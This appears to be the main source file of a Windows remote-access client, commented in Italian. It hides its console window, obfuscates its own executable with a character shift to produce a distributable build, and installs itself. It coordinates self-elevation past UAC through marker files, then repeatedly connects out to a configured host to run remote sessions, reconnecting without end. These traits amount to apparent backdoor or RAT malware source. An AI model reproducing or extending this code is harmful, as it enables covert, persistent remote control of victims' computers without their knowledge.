#include <iostream>
#include <EssNet.h>
#include <obfuscate.h>
#include <Essentials.h>
#include <EssScreen.h>
#include <json/json.hpp>
#include <zlib.h>

using Json = nlohmann::json;
using namespace cv;

string Version = "2.0.0-b.7";
int VersioneCompatibile = 5; // b7

using namespace std;

#include "Debugger.hpp"

Debugger debug;

#include "Comunicazioni.hpp"
#include "Settaggi.hpp"
#include "Installer.hpp"
#include "Services.hpp"
#include "Sessione.hpp"

int main()
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    TcpIP Client;
    SystemUtils su;
    DirUtils du;
    Encode en;
    ConsoleUtils cu;
    Settaggi sett;
    EasyMSGB msgb;
    Installer installer;

    short clientErrorCode = 0;

    AllocConsole();

    if (!debug.Active)
        cu.HideConsole();
    else
        freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);

    // Per generare la build del Client da distribuire
    if (debug.MakeBuild)
    {
        en.CharShift(69, du.GetFullModuleFilePath(), du.GetModuleFilePath() + "ClientBuild.exe");
        return 0;
    }

    // Per test locali senza installazione
    if (debug.SkipInstall)
    {
        sett.Host = "127.0.0.1";
        sett.Porta = 6969;
    }
    else
    {
        if (!installer.IsInstalled())
        {
            short rtn = installer.InstallClient();

            debug.log.Info("Codice installazione: " + to_string(rtn));

            return 0;
        }

        sett.GetAllSettings();
    }
	
    // Verifica che l'auto elevazione sia andata a buon fine
    if (du.CheckFile(du.GetModuleFilePath() + "aele1"))
    {
        if (su.CheckUAC())
        {
            // SONO IL CLIENT 1 ADMIN
            du.WriteFile(du.GetModuleFilePath() + "aeleOK");
        }
        else
        {
            if (du.CheckFile(du.GetModuleFilePath() + "aele2"))
            {
                if (du.CheckFile(du.GetModuleFilePath() + "aeleOK"))
                {
                    du.DelFile(du.GetModuleFilePath() + "aele1");
                    du.DelFile(du.GetModuleFilePath() + "aele2");
                    du.DelFile(du.GetModuleFilePath() + "aele3"); // Client 0 è vivo se il file esiste
                    du.DelFile(du.GetModuleFilePath() + "aele3"); // Client 0 è vivo se il file esiste
                    du.DelFile(du.GetModuleFilePath() + "aeleOK");
                    // SONO IL CLIENT DI EMERGENZA, Client 1 è admin
                    return 0;
                }
                else if (du.CheckFile(du.GetModuleFilePath() + "aele3"))
                {
                    du.DelFile(du.GetModuleFilePath() + "aele2");
                    // SONO IL CLIENT 1 FALLITO, Client 0 potrebbe essere vivo (se aele4 esiste)
                    return 0;
                }
                else
                {
                    du.DelFile(du.GetModuleFilePath() + "aele1");
                    du.DelFile(du.GetModuleFilePath() + "aele2");
                    // SONO IL CLIENT DI EMERGENZA, Client 0 e 1 sono morti
                }
            }
            else
            {
                if (du.CheckFile(du.GetModuleFilePath() + "aele3"))
                {
                    if (du.CheckFile(du.GetModuleFilePath() + "aele4"))
                    {
                        du.DelFile(du.GetModuleFilePath() + "aele1");
                        du.DelFile(du.GetModuleFilePath() + "aele3");
                        du.DelFile(du.GetModuleFilePath() + "aele4");
                        // SONO IL CLIENT DI EMERGENZA, Client 0 è vivo, Client 1 è morto
                        return 0;
                    }
                    else
                    {
                        du.DelFile(du.GetModuleFilePath() + "aele1");
                        du.DelFile(du.GetModuleFilePath() + "aele3");
                        // SONO IL CLIENT DI EMERGENZA, Client 0 e 1 sono morti
                    }
                }
                else
                {
                    du.DelFile(du.GetModuleFilePath() + "aele1");
                    // SONO IL CLIENT DI EMERGENZA, Client 0 e 1 sono morti
                }
            }
        }
    }

    su.GetCPUload(); // Altrimenti con il GetInfo la prima volta da sempre il 6%

    Client.Host = sett.Host;
    Client.Port = sett.Porta;

    clientErrorCode = Client.StartClient();

    if (!Client.IsOn())
    {
        Client.Stop();
        debug.log.Error("Errore durante l'avvio del Client: " + to_string(clientErrorCode));

        return 0;
    }

    debug.log.Info("Client avviato");

    while (true)
    {
        for (int i = 0; i < 300; i++)
        {
            if (Client.Connect())
            {
                debug.log.Info("Ricevuta connessione");

                if (COMUNICAZIONI::Inizializzazione(Client.Sock))
                {
                    debug.log.Info("Connessione accettata " + Client.GetIP());

                    Sessione s(Client.Sock);

                    switch (s.Start())
                    {
                        case 0:
                            closesocket(Client.Sock);
                            break;

                        case 1:
                            closesocket(Client.Sock);
                            Client.Stop();
                            return 0;
                            break;
                    }

                    debug.log.Info("Disconnesso");
                    break;
                }
            }
            else { Sleep(1000); debug.log.Info("Server OFF"); }
        }

        Client.Stop();

        while (!Client.IsOn())
        {
            debug.log.Info("Esito riavvio Client: " + to_string(Client.StartClient()));
            Sleep(1000);
        }
    }

    return 0;
}